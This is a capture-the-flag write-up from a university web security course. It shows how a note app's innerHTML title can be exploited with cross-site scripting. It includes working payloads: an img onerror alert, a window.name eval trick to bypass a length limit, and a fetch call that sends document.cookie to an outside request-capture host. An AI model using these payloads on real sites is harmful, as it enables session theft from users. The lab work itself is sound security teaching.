---
title: Simple Web - 0x09(Lab - Simple Note)
tags: [CTF, Web, eductf]

category: "Security Course｜NTU CS｜Web"
date: 2023-05-13
---

# Simple Web - 0x09(Lab - Simple Note)
<!-- more -->
###### tags: `CTF` `Web` `eductf`
Challenge: https://note.ctf.zoolab.org/

## Background
[JavaScript innerHTML 與 innerText 的差異](https://www.wibibi.com/info.php?tid=402)

## Source Code
```javascript
...
<script>
    const id = location.pathname.split('/').pop();

    fetch(`/api/note/${id}`).then(r => r.json()).then(({ title, content })=>{
        url.value = location;
        titleNode.innerHTML = title;
        contentNode.innerText = content;
    });   
</script>
...
```
For instance, if our `$id=47a8aad1b3b82dcd4decd36d`, the `script code` will fetch this data as `json` file and parse title and content.
![](https://i.imgur.com/Nwj6gCQ.png)
Then it'll change `titleNode` by `innerHTML` and change `contentNode` by `innerText`.
![](https://i.imgur.com/H8VdiIb.png)

### `innerText` VS `innerHTML`
`innerText` will filter tag but `innerHTML` will not.
For instance, `title=123` and `content=<script>123</script>`
![](https://i.imgur.com/eoXQYv5.png)


For instance, `title=<script>123</script>` and `content=123`
![](https://i.imgur.com/lGgpgQi.png)

### Analysis
According to the response, it seems has no filter of our input, so, we can choose to inject something in <font color="FF0000">`titleNode`</font>
![](https://i.imgur.com/5lNfsqw.png)


## Exploit - XSS
1. We tried to inject `<script>` tag in title but has nothing to trigger.
According to [javascript documentation](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
    > It is not uncommon to see innerHTML used to insert text into a web page. There is potential for this to become an attack vector on a site, creating a potential security risk. 
    > Although this may look like a cross-site scripting attack, the result is harmless. HTML specifies that a \<script\> tag inserted with innerHTML should not execute.
    > 
    > However, there are ways to execute JavaScript without using \<script\> elements, so there is still a security risk whenever you use innerHTML to set strings over which you have no control. For example: 
    > ```javascript
    > const name = "<img src='x' onerror='fetch()'>";
    > el.innerHTML = name; // shows the alert
    > ```

2. Use `img` tag
Payload: `<img src='x' onerror='alert(1)'>`
![](https://i.imgur.com/01YmwNW.png)

3. String limit problem...
There's something wrong, that the title has input limit with 40 character at most. So, we can use `window.name` technique that we can write our payload as long as we can.
If we set:
    ```javascript
    top.name = 'fetch("https://sbk6401.free.beeceptor.com?sh="+document.cookie)'
    ```
    Furthermore, we set our title as:**`<img src=x onerror=eval(window.name)>`**

    Then if we reload this page, it'll execute the command in `top.name`
    ![](https://i.imgur.com/B8aRmbN.png)

4. Host a server by `Beeceptor`
Note that, you should change `Content-Type` to `text/html`
![](https://i.imgur.com/eg4UUpl.png)
Then we can change the Report URL as what we set in `Beeceptor`
![](https://i.imgur.com/fVTg6oI.png)

5. Detail about workflow
    <img src="/assets/posts/Security Course/Simple Web - 0x08(Lab - Particles.js)-workflow.png" width=300>

## Reference
[在XSS测试中如何绕过字符长度限制](https://zhuanlan.zhihu.com/p/93192936)